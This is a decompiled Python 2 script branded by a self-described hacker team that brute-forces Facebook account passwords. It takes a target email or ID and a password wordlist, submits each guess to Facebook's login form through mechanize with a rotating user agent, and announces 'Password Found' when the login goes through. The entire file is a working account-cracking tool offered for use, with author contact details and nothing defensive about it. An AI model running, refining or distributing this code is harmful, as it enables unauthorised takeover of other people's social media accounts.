#decompile by Haris Haroon 3:)
#okay decompiling target.pyc
#----------------------------------------
# Decompile by : Haris Haroon
# Github : https://github.com/420cracket
#-----------------------------------------
"""
logo = ''''''""
\033[1;91m:
☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️
Author : Haris
City    :  Taunsa
Team : Taunsa Hackers
Whatsapp : 03156687519
BruteTarget.py
Created by AuthenticXploit on 09/07/2021.
Copyright (c) 2021 Copyright Holder. All rights reserved.
"""
try:
    import sys, mechanize, cookielib, random, os, time
    from os import system
    from time import sleep
    from sys import exit
except ImportError as f:
    system('clear')
    print ('\x1b[32;1m[\x1b[31;1m!\x1b[32;1m] \x1b[0;33mError \x1b[31;1m: \x1b[37;1m{}').format(f)

banner = "\x1b[36;1m\n  ____             _       _____ ____  \n | __ ) _ __ _   _| |_ ___|  ___| __ ) \n |  _ \\| '__| | | | __/ _ \\ |_  |  _ \\\x1b[1;97m\n | |_) | |  | |_| | ||  __/  _| | |_) |\n |____/|_|   \\__,_|\\__\\___|_|   |____/ \n                     \n     \x1b[1;97m CYBER NAME   \x1b[31;1m:  \x1b[32mMAFIA-KILLER\n     \x1b[1;97m WHATSAPP     \x1b[31;1m:  \x1b[32m+92132197796\n     \x1b[1;97m NOTE  \x1b[31;1m       :  \x1b[32mUSE 4G SIM NET\n     \x1b[1;97m NOTE  \x1b[31;1m       :  \x1b[32mDON,T CALL ME ONLY TEXT\n     \x1b[1;97m\n"

def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        sleep(2.0 / 90)


system('clear')
slowprint(banner)
email = str(raw_input('\x1b[37;1minput TARGET ID   \x1b[31;1m: \x1b[33;1m'))
passwordlist = str(raw_input('\x1b[37;1minput passlist path( passlist.txt ) \x1b[31;1m: \x1b[33;1m'))
login = 'https://www.facebook.com/login.php?login_attempt=1'
useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def main():
    global br
    try:
        br = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        br.set_handle_robots(False)
        br.set_handle_redirect(True)
        br.set_cookiejar(cj)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        menu()
        search()
        print '\x1b[32;1m[\x1b[31;1m!\x1b[32;1m]\x1b[33;1m Password does not exist in the passlist'
    except mechanize.URLError:
        print '\n\x1b[32;1m[\x1b[31;1m!\x1b[32;1m]\x1b[33;1m No Connection'
        sleep(2)
        print '\x1b[32;1m[\x1b[31;1m!\x1b[32;1m] \x1b[31;1mExit\x1b[0m'
        exit()


def brute(password):
    sys.stdout.write(('\x1b[36;1m\r[\x1b[33;1m-\x1b[36;1m] \x1b[37;1mTrying Password \x1b[31;1m=> \x1b[33;1m{}\n').format(password))
    sys.stdout.flush()
    br.addheaders = [('User-agent', random.choice(useragents))]
    site = br.open(login)
    br.select_form(nr=0)
    br.form['email'] = email
    br.form['pass'] = password
    sub = br.submit()
    log = sub.geturl()
    if log != login and 'login_attempt' not in log:
        print ('\x1b[36;1m[\x1b[33;1m+\x1b[36;1m] \x1b[37;1mPassword Found => \x1b[32;1m{}').format(password)
        raw_input('\x1b[31;1mANY KEY to Exit....')
        exit(1)


def search():
    global password
    passwords = open(passwordlist, 'r')
    for password in passwords:
        password = password.replace('\n', '')
        brute(password)


def menu():
    try:
        total = open(passwordlist, 'r')
        total = total.readlines()
        print banner
        print ('\x1b[36;1m[\x1b[31;1m-\x1b[36;1m] \x1b[32;1mAccount to crack \x1b[31;1m> \x1b[0;33m{}').format(email)
        print '\x1b[36;1m[\x1b[31;1m-\x1b[36;1m] \x1b[32;1mLoaded \x1b[31;1m>\x1b[0;33m', len(total), 'passwords'
        print '\x1b[36;1m[\x1b[31;1m-\x1b[36;1m] \x1b[33;1mCracking, please wait ...\n'
    except IOError:
        print ('\n\x1b[32;1m[\x1b[31;1m!\x1b[32;1m]\x1b[33;1m File wordlist \x1b[36;1m{} \x1b[33;1mNot Found\x1b[0m').format(passwordlist)
        exit()


if __name__ == '__main__':
    try:
        main()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[36;1m\n[\x1b[31;1m!\x1b[36;1m]\x1b[33;1mDetects a forced stop program \x1b[0m'
        exit(0)
